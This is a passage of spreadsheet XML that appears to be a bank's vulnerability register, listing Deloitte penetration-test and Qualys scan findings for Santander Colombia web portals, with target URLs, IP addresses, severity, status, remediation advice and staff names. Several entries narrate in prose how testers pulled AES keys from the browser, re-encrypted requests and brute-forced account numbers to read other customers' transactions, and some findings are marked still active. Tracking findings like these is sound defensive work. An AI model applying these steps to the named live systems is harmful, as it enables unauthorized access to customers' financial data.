    <d v="2025-11-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The cookie does not contain the &amp;quot;secure&amp;quot; attribute."/>
    <s v="If the associated risk of a compromised account is high, apply the &amp;quot;secure&amp;quot; attribute to cookies and force all sensitive requests to be sent via HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="485"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <s v="MAN-689db2cf07d3017240603433"/>
    <s v="SCBD-25-CNMPO-006-AP-001"/>
    <x v="142"/>
    <m/>
    <s v="Solved"/>
    <x v="0"/>
    <s v="9,5"/>
    <m/>
    <m/>
    <s v="https://181.57.221.233/PortalDeInformacion:443"/>
    <m/>
    <m/>
    <d v="2025-08-14T00:00:00"/>
    <n v="313"/>
    <d v="2025-08-24T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  Las &quot;Referencias Inseguras a Objetos de manera Directa&quot; (IDOR) se producen cuando una aplicación proporciona acceso directo a los objetos en función de la entrada proporcionada por el usuario (Normalmente un identificador de objeto).   Esta vulnerabilidad permite a los atacantes evadir la autorización y acceder a los recursos directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto. Dichos recursos pueden ser entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema y más. Esto se debe al hecho de que la aplicación toma la entrada proporcionada por el usuario y la utiliza para recuperar un objeto sin realizar suficientes comprobaciones de autorización.       Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera previa.       SCBD-25-CNMPO-006-AP-001:   El aplicativo no realiza una correcta comprobación del acceso a los recursos del usuario en el Backend, pudiendo acceder un usuario de manera directa a información no legítima modificando el identificador que referencia al objeto que muestra la información accesible.   En este caso particular, un usuario puede acceder de manera directa al histórico de transacciones realizadas desde la cuenta de cualquier usuario modificando valor del parámetro &quot;cuenta&quot; de la funcionalidad &quot;Histórico de transacciones&quot; el cual se envía a través de una estructura en formato JSON que se encuentra cifrada mediante el algoritmo AES.   A continuación se muestra el acceso a la información no autorizada al usuario. Dado que el parámetro JSON se envía de manera cifrada primero se ha de localizar el &quot;vector de inicialización&quot; y la &quot;Key&quot; utilizada para poder descifrar la información y una vez modificada volverla a cifrar para poder enviarla al servidor.   El acceso a los datos &quot;Vector de inicialización&quot; y &quot;Key&quot; se realiza a través de la consola JS del propio navegador web utilizado para acceder al aplicativo. Se han identificado los métodos JavaScript que realizan el cifrado/descifrado de información, aes256Decrypt y aes256Encrypt. Por otro lado, se establecen &quot;breakpoints&quot; en los métodos indicados para poder acceder a los valores de las variables &quot;iv&quot; y &quot;key&quot; antes de ser utilizadas. La siguiente ilustración muestra el acceso a los valores indicados.      Una vez localizados estos valores se pueden utilizar para descifrar la información cifrada      Para poder facilitar la tarea de cifrado y descifrado de información se utiliza un módulo que permite realizar fácilmente esta operativa en BurpSuite.      Disponiendo de los valores para poder cifrar y descifrar información se comprueba que existe una funcionalidad en la aplicación para poder acceder al histórico de transacciones realizadas en la cuenta de un determinado usuario      Comprobamos que al realizar la solicitud los datos se envían cifrados en el cuerpo de la petición HTTP.      Se utiliza el módulo de descifrado para comprobar los datos que se envían en la petición. Se comprueba que uno de los parámetros enviados es el número de cuenta.      Se realiza una ataque de fuerza bruta iterando el número de cuenta y cifrando los datos antes de ser enviados      Se comprueba que para cada número de cuenta el aplicativo devuelve tamaños distintos de respuesta lo que indica que se están devolviendo las transacciones realizadas por los distintos números de cuenta.      Si accedemos a una de las respuestas recibidas para la cuenta 830000030000 accedemos a las transacciones cifradas      A las que podemos acceder en texto claro utilizando la &quot;key&quot; y el &quot;iv&quot; obtenidos anteriormente, comprobando que las transacciones obtenidas son las de la cuenta 830000030000      La siguiente ilustración muestra las transacciones realizadas desde la cuenta 830000030000 cargadas en el aplicativo."/>
    <s v="  Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene privilegios de acceso a la información consultada."/>
    <m/>
    <d v="2025-08-22T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="486"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <s v="MAN-689dbd4407d3017240603434"/>
    <s v="SCBD-25-CNMPO-006-AP-002"/>
    <x v="201"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="6,4"/>
    <m/>
    <m/>
    <s v="https://181.57.221.233/PortalDeInformacion:443"/>
    <m/>
    <m/>
    <d v="2025-08-14T00:00:00"/>
    <n v="313"/>
    <d v="2025-11-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  La aplicación debe garantizar que únicamente se puedan ingresar datos coherentes para la lógica de negocio en la propia aplicación. Así mismo, también se ha de realizar una validación de este tipo de lógica directamente en el lado del servidor para garantizar que un usuario malintencionado no haga uso de proxies intermedios para manipular estos datos para evadir las restricciones impuestas en el front-end, cuando esta información se encuentra en tránsito.   Las vulnerabilidades relacionadas con la validación de lógica de negocio son únicas ya que son específicas de cada aplicación debido a que tratan de modificar los datos lógicos que la aplicación acepta para su correcto funcionamiento.   En este caso particular es posible modificar información del aplicativo que se encuentran restringidos y que no se deberían poder modificar.       Un atacante puede hacer que una funcionalidad de la aplicación puede alterar su funcionamiento o forzar a que se comporte de una manera inesperada. De esta manera es posible evadir ciertas restricciones de lógica de negocio impuestas por la aplicación, o sobrepasar los límites impuestos por la misma.       SCBD-25-CNMPO-006-AP-002:   Durante las pruebas realizadas sobre la aplicación se ha podido comprobar que no se están aplicando las validaciones de la lógica de negocio pertinentes a la hora de modificar los datos personales restringidos de un usuario.   A continuación, se muestran evidencias de la evasión de la lógica de negocio en los que un usuario puede modificar sus datos personales restringidos como &quot;Nombre&quot;, &quot;Apellido&quot; o &quot;Cédula de identidad&quot; entre otros:      La siguiente ilustración muestra los datos personales del usuario, se puede comprobar que existen datos que la aplicación no permite modificar.      Al enviar la petición para guardar los datos personales comprobamos que se envía cifrada.      Podemos utilizar los valores &quot;iv&quot; y &quot;key&quot; para cifrar y descifrar la información transmitida, tal y como se ha explicado en la vulnerabilidad &quot;Referencias Inseguras a Objetos de manera Directa (IDOR)&quot; descritas en este mismo documento. La siguiente captura muestra los datos en claro que se envían para realizar la modificación de los datos personales.      A modo de ejemplo se modifica el nombre del usuario (el cual es un campo no modificable) por &quot;JOAN-TEST&quot; y se cifra el contenido del JSON      Se envía la petición con el JSON modificado y cifrado. en AES con la &quot;key&quot; e &quot;iv&quot; correspondientes.      Como se puede comprobar los datos personales del usuario han sido modificados."/>
    <s v="  Tanto el front-end como el back-end de la aplicación deben verificar y validar que los datos introducidos por los usuarios cumplen con la lógica de negocio de cada funcionalidad de la aplicación y aplicar las restricciones pertinentes dependiendo de los tipos de datos que espera la aplicación."/>
    <m/>
    <s v="21/09/2025_x000a_20/02/2026"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="487"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <s v="MAN-689dbfbe07d3017240603435"/>
    <s v="SCBD-25-CNMPO-006-CO-003"/>
    <x v="5"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4,4"/>
    <m/>
    <m/>
    <s v="https://181.57.221.233/PortalDeInformacion:443"/>
    <m/>
    <m/>
    <d v="2025-08-14T00:00:00"/>
    <n v="313"/>
    <d v="2025-11-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma.       SCBD-25-CNMPO-006-CO-003:   Durante las pruebas realizadas se ha comprobado que la cabecera de respuesta HTTP &quot;Server&quot; revelan información interna acerca del tipo de servidor y versión del mismo así como información de la infraestructura interna de la aplicación a través de la dirección URL https://181.57.221.233/PortalDeInformacion/#/login   A continuación, se incluye una evidencia de ejemplo que muestra la información del servidor expuesta."/>
    <s v="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
    <m/>
    <d v="2025-09-21T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="488"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <s v="MAN-689dc1fa07d3017240603436"/>
    <s v="SCBD-25-CNMPO-006-AP-004"/>
    <x v="154"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4,1"/>
    <m/>
    <m/>
    <s v="https://181.57.221.233/PortalDeInformacion:443"/>
    <m/>
    <m/>
    <d v="2025-08-14T00:00:00"/>
    <n v="313"/>
    <d v="2025-11-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  Se ha detectado que la aplicación devuelve información acerca del direccionamiento IP interno del servidor. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros.   Este tipo de información puede ser accesible a través de las cabeceras HTTP, mensajes de error y/o páginas por defecto.       Un atacante podría utilizar esta vulnerabilidad para obtener información del direccionamiento IP del sistema, pudiendo llegar a localizar otros activos vulnerables en la red o mapear la red interna.       SCBD-25-CNMPO-006-AP-004:   La aplicación auditada divulga información acerca de direcciones IP internas utilizadas en el token de autenticación tipo Bearer de la aplicación.   A continuación, se muestra el token Bearer codificado en Base64:      Si decodificamos el token en Base64 comprobamos que se expone la dirección IP interna del servidor &quot;180.26.130.49&quot;"/>
    <s v="  Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento interno del servidor, como puede ser direccionamiento IP de la red interna en la que está ubicado el mismo."/>
    <m/>
    <s v="21/09/2025_x000a_20/02/2026"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="489"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <m/>
    <s v="SCBD-25-CNMPO-006-CO-005"/>
    <x v="196"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="https://181.57.221.233/PortalDeInformacion:443"/>
    <m/>
    <m/>
    <d v="2025-08-14T00:00:00"/>
    <n v="313"/>
    <d v="2025-12-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor acepta más métodos HTTP de los únicos necesarios para el correcto funcionamiento del aplicativo. Estos métodos podrían permitir a un atacante realizar ciertas acciones en el sistema, desde la obtención de información o incluso creación o borrado de elementos."/>
    <s v="Se recomienda denegar el uso de los métodos TRACE, OPTIONS y CONNECT siempre que sea_x000a_posible._x000a_Además, los métodos PUT y DELETE únicamente han de ser permitidos únicamente en aplicaciones_x000a_de tipo API RESTFUL en las que se necesite su uso ._x000a_Por otro lado, los métodos GET, POST y HEAD son considerados como métodos seguros y han de_x000a_estar habilitados en todas las aplicaciones (HEAD es opcional) que utilicen los protocolos_x000a_HTTP/HTTPS para comunicarse."/>
    <s v="vulnerabilidad de gravedad media vista en la red más de 90 días después de la publicación de la CVE."/>
    <d v="2025-09-21T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="490"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-3f9ce292-fe00-4d38-b9fc-9e174ab9f7f9"/>
    <m/>
    <x v="202"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.5"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/auth/ApiContract/contract/1"/>
    <m/>
    <m/>
    <d v="2025-09-06T00:00:00"/>
    <n v="290"/>
    <d v="2025-10-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el escaneo WAS, se observó que el token JWT utilizado en el encabezado de autorización contiene un algoritmo simétrico."/>
    <s v="Revisa el token JWT establecido en el encabezado de Autorización para usar solo un algoritmo de firma seleccionado. Para mas detalles consulta el CWE-20"/>
    <s v="Un atacante podría proporcionar valores inesperados y provocar un bloqueo del programa o un control arbitrario de la asignación de recursos, lo que provocaría un consumo excesivo de recursos como la memoria y la CPU."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="491"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-a6fbaa31-47ea-4a2c-aa9a-e5c028fcb2b3"/>
    <m/>
    <x v="202"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.5"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/auth/ApiContract/rubros?codigoProducto=RI"/>
    <m/>
    <m/>
    <d v="2025-09-06T00:00:00"/>
    <n v="290"/>
    <d v="2025-10-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el escaneo WAS, se observó que el token JWT utilizado en el encabezado de autorización contiene un algoritmo simétrico."/>
    <s v="Revisa el token JWT establecido en el encabezado de Autorización para usar solo un algoritmo de firma seleccionado. Para mas detalles consulta el CWE-21"/>
    <s v="Un atacante podría proporcionar valores inesperados y provocar un bloqueo del programa o un control arbitrario de la asignación de recursos, lo que provocaría un consumo excesivo de recursos como la memoria y la CPU."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="492"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-5d42c4b7-8e62-4db6-a212-19b643726fa7"/>
    <m/>
    <x v="202"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.5"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/auth/apiDisclaimer/images/getIdByCategoria/1"/>
    <m/>
    <m/>
    <d v="2025-09-06T00:00:00"/>
    <n v="290"/>
    <d v="2025-10-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el escaneo WAS, se observó que el token JWT utilizado en el encabezado de autorización contiene un algoritmo simétrico."/>
    <s v="Revisa el token JWT establecido en el encabezado de Autorización para usar solo un algoritmo de firma seleccionado. Para mas detalles consulta el CWE-22"/>
    <s v="Un atacante podría proporcionar valores inesperados y provocar un bloqueo del programa o un control arbitrario de la asignación de recursos, lo que provocaría un consumo excesivo de recursos como la memoria y la CPU."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="493"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-747d2133-aa51-44c4-bb55-9f49e2890061"/>
    <m/>
    <x v="202"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.5"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/auth/apiri/configuracionGeneral/consultarConfiguraciones"/>
    <m/>
    <m/>
    <d v="2025-09-06T00:00:00"/>
    <n v="290"/>
    <d v="2025-10-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el escaneo WAS, se observó que el token JWT utilizado en el encabezado de autorización contiene un algoritmo simétrico."/>
    <s v="Revisa el token JWT establecido en el encabezado de Autorización para usar solo un algoritmo de firma seleccionado. Para mas detalles consulta el CWE-23"/>
    <s v="Un atacante podría proporcionar valores inesperados y provocar un bloqueo del programa o un control arbitrario de la asignación de recursos, lo que provocaría un consumo excesivo de recursos como la memoria y la CPU."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="494"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-4db93f29-e069-4833-a54b-629c73b6d6b1"/>
    <m/>
    <x v="202"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.5"/>
    <m/>
    <m/>
    <s v="https://portalrecaudos.santander.com.co/auth/apiportal/configuracion/oauth2"/>
    <m/>
    <m/>
    <d v="2025-09-06T00:00:00"/>
    <n v="290"/>
    <d v="2025-10-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el escaneo WAS, se observó que el token JWT utilizado en el encabezado de autorización contiene un algoritmo simétrico."/>
    <s v="Revisa el token JWT establecido en el encabezado de Autorización para usar solo un algoritmo de firma seleccionado. Para mas detalles consulta el CWE-24"/>
    <s v="Un atacante podría proporcionar valores inesperados y provocar un bloqueo del programa o un control arbitrario de la asignación de recursos, lo que provocaría un consumo excesivo de recursos como la memoria y la CPU."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="495"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <s v="MAN-685bc8716c975521ca412cf3"/>
    <s v="SCBD-25-CNMPO-002-CO-004"/>
    <x v="203"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="servicios.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-09-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante el análisis del funcionamiento interno de la aplicación web, se identificó el mecanismo de cifrado utilizado para proteger datos sensibles transmitidos al backend, particularmente en el parámetro params"/>
    <s v="No se debería de exponer el código de lógica de cifrado a internet"/>
    <s v="Un atacante con acceso al código y a la lógica del cifrado, puede realizar un ejercicio de ingeniería inversa y ver las peticiones que se envían."/>
    <d v="2025-09-15T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="496"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <s v="MAN-685bc9936c975521ca412d1a"/>
    <s v="SCBD-25-CNMPO-002-CO-005"/>
    <x v="203"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="servicios.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-09-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación expone una parte del código fuente interno de la aplicación a través del frontend. Normalmente esta fuga de información puede estar contenida en los  comentarios de la aplicación, aunque en ciertas ocasiones y dependiendo del lenguaje y framework utilizado para desarrollar la aplicación también es posible acceder al código fuente a través de peticiones específicas del framework."/>
    <s v="Se recomienda revisar el código de la aplicación y eliminar el código fuente interno de la aplicación._x000a_Por otro lado, se ha de evitar que se pueda acceder directamente al código fuente interno de la_x000a_aplicación"/>
    <s v="El código fuente expuesto permite a un atacante realizar ataques más dirigidos contra la plataforma. Adicionalmente, supone un riesgo reputacional para la organización"/>
    <d v="2025-09-15T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="497"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <s v="MAN-685bcab26c975521ca412d1b"/>
    <s v="SCBD-25-CNMPO-002-CO-006"/>
    <x v="204"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="servicios.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-09-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Muchas de las acciones o funcionalidades que presentan las aplicaciones requieren establecer límites en el número de veces que se puede realizar una determinada  funcionalidad o acción. Las aplicaciones deben controlar que un usuario no pueda exceder un límite en el uso de estas funcionalidades ya que, en determinados casos, cada vez que se utiliza la funcionalidad afectada en el aplicativo, el usuario puede obtener algún tipo de beneficio o causar algún tipo de acción no deseada sobre la aplicación. Por ejemplo: un sitio de comercio electrónico solo puede permitir que_x000a_los usuarios apliquen un descuento una vez por transacción o se pueda valorar y/o comentar una única vez cada producto obtenido._x000a_Las vulnerabilidades relacionadas con las pruebas de los límites de función son específicas de cada aplicación en concreto y diseñar pruebas acordes a la funcionalidad y acciones de la propia aplicación._x000a__x000a_Un atacante podría eludir la lógica de negocio y ejecutar una funcionalidad más veces de las permitidas obteniendo algún tipo de beneficio o acción malintencionada en la aplicación."/>
    <s v="La aplicación debe controlar la lógica de negocio para garantizar que una determinada_x000a_funcionalidad o acción solo puede ejecutarse un cierto número de veces limitado, cuando se_x000a_alcance el límite establecido, el usuario ya no puede ejecutar la funcionalidad._x000a_Dependiendo de la acción afectada se controlará el número de veces que una acción se puede_x000a_utilizar, o las veces que se puede utilizar en un determinado intervalo de tiempo."/>
    <s v="La ausencia de controles para evitar automatizaciones puede dar lugar a diferentes tipos de ataque_x000a_como, por ejemplo, ataques de fuerza bruta para tratar de averiguar las credenciales de un usuario,_x000a_ataques de denegación de servicio al abusar de un formulario para obtener algún tipo de_x000a_descuento y otro tipo de ataques que resultan en la evasión de la lógica de negocio de la aplicación."/>
    <d v="2025-09-15T00:00:00"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="498"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-5101867b-a7d6-43d2-b869-e74b2dd18dc0"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A Web server was detected that supports the HTTP TRACE method. This method allows debugging and connection trace analysis for connections from the client to the Web server. Per the HTTP specification, when this method is used, the Web server echoes back the information sent to it by the client unmodified and unfiltered. Microsoft IIS web server uses an alias TRACK for this method, and is functionally the same._x000a__x000a_A vulnerability related to this method was discovered. A malicious, active component in a Web page can send Trace requests to a Web server that supports this Trace method. Usually, browser security disallows access to Web sites outside of the present site's domain. Although unlikely and difficult to achieve, it's possible, in the presence of other browser vulnerabilities, for the active HTML content to make external requests to arbitrary Web servers beyond the hosting Web server. Since the chosen Web server then echoes back the client request unfiltered, the response also includes cookie-based or Web-based (if logged on) authentication credentials that the browser automatically sent to the specified Web application on the specified Web server. _x000a__x000a_The significance of the Trace capability in this vulnerability is that the active component in the page visited by the victim user has no direct access to this authentication information, but gets it after the target Web server echoes it back as its Trace response. _x000a__x000a_Since this vulnerability exists as a support for a method required by the HTTP protocol specification, most common Web servers are vulnerable._x000a__x000a_The exact method(s) supported, Trace and/or Track, and their responses are in the Results section below._x000a__x000a_Track / Trace are required to be disabled to be PCI compliance."/>
    <s v="Solutions for some of the common Web servers are supplied below. For other Web servers, please check your vendor's documentation._x000a__x000a_Apache: Recent Apache versions have a Rewrite module that allows HTTP requests to be rewritten or handled in a specific way. Compile the Apache server with the mod_rewrite module. You might need to uncomment the 'AddModule' and 'LoadModule' directives in the httpd.conf configuration file. Add the following lines for each virtualhost in your configuration file (Please note that, by default, Rewrite configurations are not inherited. This means that you need to have Rewrite directives for each virtual host in which you wish to use it):_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} ^TRACE_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_With this configuration, Apache catches all TRACE requests, and replies with a page reporting the request as forbidden. None of the original request's contents are echoed back._x000a__x000a_A slightly tighter fix is to use:_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)$_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Please note that RewriteEngine can be processor intensive and may impact the web server performance. The trace method can also be controlled by use of the TraceEnable directive._x000a_In the httpd.conf add or modify:_x000a__x000a_TraceEnable Off_x000a__x000a__x000a_Microsoft IIS: Microsoft released URLScan, which can be used to screen all incoming requests based on customized rulesets. URLScan can be used to sanitize or disable the TRACE requests from the clients. Note that IIS aliases 'TRACK' to 'TRACE'. Therefore, if URLScan is used to specfically block the TRACE method, the TRACK method should also be added to the filter._x000a__x000a_URLScan uses the 'urlscan.ini' configuration file, usually in \System32\InetSrv\URLScan directory. In that, we have two sections - AllowVerbs and DenyVerbs. The former is used if the UseAllowVerbs variable is set to 1, else (if its set to 0), the DenyVerbs are used. Clearly, either can be used, depending on whether we want a Default-Deny-Explicit-Allow or a Default-Allow-Explicit-Deny policy. To disallow TRACE and TRACK methods through URLScan, first remove 'TRACK', 'TRACE' methods from the 'AllowVerbs' section and add them to the 'DenyVerbs' section. With this, URLScan will disallow all 'TRACE' and 'TRACK' methods, and generate an error page for all requests using that method. To enable the changes, restart the 'World Wide Web Publishing Service' from the 'Services' Control Panel item._x000a_For more details about other web servers : Cert Advisory."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="499"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-6e8d73c9-14e2-4095-9745-3ae3b7909cda"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The remote Web server supports the TRACE and/or TRACK HTTP methods, which makes it easier for remote attackers to steal cookies and authentication credentials or bypass the HttpOnly protection mechanism._x000a__x000a_Track / Trace are required to be disabled to be PCI compliance."/>
    <s v="Disable these methods in your web server's configuration file."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="500"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-479933b6-0d1f-4aaa-a406-98e7a05aaf96"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The Web server has some listable directories. Very sensitive information can be obtained from directory listings."/>
    <s v="Disable directory browsing or listing for all directories."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="501"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PSE"/>
    <s v="QA-WAS-3e98acce-f3da-420f-8957-a007ab621d93"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="psepagos.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-09-13T00:00:00"/>
    <n v="283"/>
    <d v="2025-12-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="This QID reports the absence of the following HTTP headers according to CWE-693: Protection Mechanism Failure:_x000a_X-Frame-Options: This HTTP response header improves the protection of web applications against clickjacking attacks. Clickjacking, also known as a &quot;UI redress attack&quot;, allows an attacker to use multiple transparent or opaque layers to trick a targeted user into clicking on a button or link on another page when they were intending to click on the the top level page. _x000a_X-XSS-Protection: This HTTP header enables the browser built-in Cross-Site Scripting (XSS) filter to prevent cross-site scripting attacks. X-XSS-Protection: 0; disables this functionality._x000a_X-Content-Type-Options: This HTTP header prevents attacks based on MIME-type mismatch. The only possible value is nosniff. If your server returns X-Content-Type-Options: nosniff in the response, the browser will refuse to load the styles and scripts in case they have an incorrect MIME-type. _x000a_Strict-Transport-Security: The HTTP Strict-Transport-Security response header (HSTS) is a security feature that lets a web site tell browsers that it should only be 